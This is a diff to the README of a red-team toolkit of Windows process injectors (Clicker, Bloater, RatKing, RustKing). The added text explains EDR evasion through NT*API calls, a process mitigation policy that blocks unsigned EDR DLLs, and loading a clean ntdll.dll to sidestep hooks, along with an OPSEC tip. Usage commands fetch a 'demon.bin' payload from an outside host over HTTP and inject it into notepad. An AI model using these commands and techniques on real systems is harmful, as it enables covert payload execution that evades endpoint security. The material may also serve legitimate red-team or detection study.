@@ -82,7 +82,6 @@ Clicker is a Proof-of-Concept loader for code injection using NT\*API calls to d
 | VirtualProtectEx   | NtProtectVirtualMemory |
 | CreateRemoteThread | NtCreateThreadEx |
 
-
 **OPSEC Tips:** Allocating RWX region is a major outlier for detection as programs will rarely have memory region of RWX. Always allocate RW then flip it to RX.
 ```
 C:\>Clicker.exe -u http://192.168.231.128:9090/demon.bin -t notepad -p 4160 -k
@@ -160,6 +159,7 @@ Process Injector 2: Clicker (Nt*API)
 ```
 
 ### Bloater
+Bloater is a wrapper used to side-load `Clicker` as a mean to demonstrate Process Mitigation Policy. This technique prevents security vendors from reflectively loading EDR DLLs that are not digitally signed by Microsoft. As a result, `kernel32.dll` and `ntdll.dll` of newly spawned processes will not be hooked by EDR vendors unless they have Intermediate Certificates handed out by Microsoft.
 ```
 C:\>Bloater.exe -f ./Clicker.exe -p 4160 -u http://192.168.231.128:9090/demon.bin -t notepad -s 4160
                                                                     _
@@ -215,6 +215,7 @@ Process Injector 3 (Wrapper): Bloater (Process Mitigation Policy)
 ```
 
 ### RatKing
+RatKing is the successor of `Clicker` as it uses the same boilerplate to perform process injection. At runtime, a fresh copy of `ntdll.dll` is loaded into the process. The original `ntdll.dll` that was hooked by EDR is left untouched. All NT*API are exported and called from the clean copy of `ntdll.dll` instead. This EDR evasion method is especially effective because the integrity of EDR hooks are not tampered with.
 ```
 C:\>RatKing.exe -u http://192.168.231.128:9090/demon.bin -t notepad -p 4160 -k
 
@@ -306,6 +307,9 @@ Process Injector 4: RatKing (Manual Mapping ntdll.dll)
 ```
 
 ### RustKing
+RustKing is an adapted version of `RatKing` on steroids, written in Rust.
+
+**NOTE:** RustKing does not support HTTPS payload download and PPID spoofing. Additionally, target process has to be opened manually prior to running RustKing.
 ```
 C:\>RustKing.exe --url http://192.168.231.128:9090/demon.bin --target notepad.exe
 
